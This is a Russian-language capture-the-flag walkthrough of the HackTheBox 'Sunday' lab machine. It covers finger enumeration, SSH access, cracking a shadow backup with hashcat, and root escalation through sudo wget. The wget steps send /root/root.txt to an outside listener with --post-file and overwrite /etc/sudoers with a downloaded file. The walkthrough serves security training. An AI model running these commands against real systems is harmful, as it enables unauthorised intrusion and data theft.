1. Разведка (Reconnaissance)

```bash
sudo nmap -sC -sV -p- sunday.htb
```

**Результат:**
- `79/tcp` - Finger service
- `22022/tcp` - SSH (OpenSSH 8.4, нестандартный порт)
- Платформа - **Solaris** (судя по большому количеству системных аккаунтов и специфике)

## 2. Энумерация пользователей через Finger

Используем Metasploit-сканер или `finger-user-enum.pl`:

```bash
msfconsole
use scanner/finger/finger_users
set RHOST 10.129.77.192
run
```

**Найдены пользователи:** `root`, `sammy`, `sunny`, `adm`, `bin`, `daemon`, `sshd`, `openldap` и другие системные аккаунты, типичные для Solaris.

## 3. Целевой запрос к root через Finger - находим пароль

```bash
./finger-user-enum.pl -u root -t 10.129.77.192
```

**Ответ сервиса:**
```
root@10.129.77.192: root     Super-User     pts/3     <Apr 24 10:37>     sunday
```

**Ключевая находка:** поле "Office Location" (обычно пустое или содержит реальное имя) в данном случае содержит строку `sunday` - это был оставленный администратором пароль/подсказка, специфичная именно для этой машины.

## 4. Подключение по SSH

Раз у `sunny` в выводе finger был указан терминал `ssh` (в отличие от `root`, у которого `console` - локальный вход), пробуем именно этого пользователя:

```bash
ssh -p 22022 sunny@sunday.htb
# Password: sunday
```

Успешный вход:
```
sunny@sunday:~$
```

## 5. Ловушка - `/root/troll`

```bash
sudo -l
```
```
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll
```

```bash
sudo /root/troll
```
```
testing
uid=0(root) gid=0(root)
```

**Это обманка** - скрипт просто печатает вывод `id`, выполненный от root, и тут же завершается, возвращая обычную оболочку `sunny`. Реального root-доступа не даёт.

## 6. Поиск реального вектора - находим backup

```bash
cd /backup
ls
# agent22.backup  shadow.backup

cat shadow.backup
```

Находим забытую резервную копию `/etc/shadow` с хешами паролей:
```
sammy:<SHA256_HASH>:6445::::::
sunny:<SHA256_HASH>:17636::::::
```

Формат `$5$` - SHA-256 crypt (Unix), соответствует hashcat mode **7400**.

## 7. Взлом хеша sammy

```bash
echo '<SHA256_HASH>' > hashes.txt

hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Важный нюанс формата:** в файл с хешами нужно записывать **только** сам хеш (начиная с `$5$`), без префикса `username:` - иначе hashcat выдаёт `Token length exception`.

**Результат:** пароль sammy - `<PASSWORD>`

## 8. Вход как sammy, user flag

```bash
ssh -p 22022 sammy@sunday.htb
# Password: <PASSWORD>

cat user.txt
# <USER_FLAG>
```

## 9. Enumeration для privesc - находим wget

```bash
sudo -l
```
```
User sammy may run the following commands on sunday:
    (root) NOPASSWD: /usr/bin/wget
```

Классический GTFOBins-вектор - `wget` с root-правами без пароля.

## 10. Эксплуатация - эксфильтрация root.txt через --post-file

**Листенер на Kali:**
```bash
nc -lvnp 8000
```

**На целевой машине:**
```bash
sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
```

`wget` отправляет содержимое файла как тело POST-запроса на свой listener - в принятом запросе виден флаг прямо в теле:
```
<ROOT_FLAG>
```

## 11. Полноценный root через перезапись /etc/sudoers

**Готовим вредоносный sudoers-файл на Kali:**
```bash
echo "sammy ALL=(ALL) NOPASSWD: ALL" > sudoers
python3 -m http.server 8000
```

**На целевой машине - скачиваем и перезаписываем системный файл:**
```bash
sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
```

`wget` выполняется с правами root (благодаря sudo), поэтому может писать в защищённую директорию `/etc/`, перезаписывая файл правил sudo.

## Ключевые уроки машины

1. **Finger (порт 79) - недооценённый источник разведданных.** Не только список пользователей, но иногда и прямые подсказки в полях типа "Office Location", которые администраторы забывают очистить.
2. **Нестандартные порты не скрывают сервис от сканирования** - `-p-` (полное сканирование) обязательно, иначе SSH на 22022 легко пропустить.
3. **Распознавание "ловушек" (troll-файлов)** - не каждый `sudo -l` результат ведёт к реальному root; вывод `uid=0` от короткоживущего процесса ещё не значит полноценный shell.
4. **Забытые backup-файлы** - классика пентеста, `/backup/shadow.backup` дал прямой путь к хешам паролей.
5. **GTFOBins для wget** - бинарник с root-правами через sudo можно использовать не только по прямому назначению: чтение произвольных файлов через `--post-file` или `file://`, и даже перезапись системных файлов через `-O`, если путь доступен для записи root.
6. **Форматирование hash-файлов для hashcat** - только сам хеш, без логина/метаданных, иначе парсер ругается на длину токена.
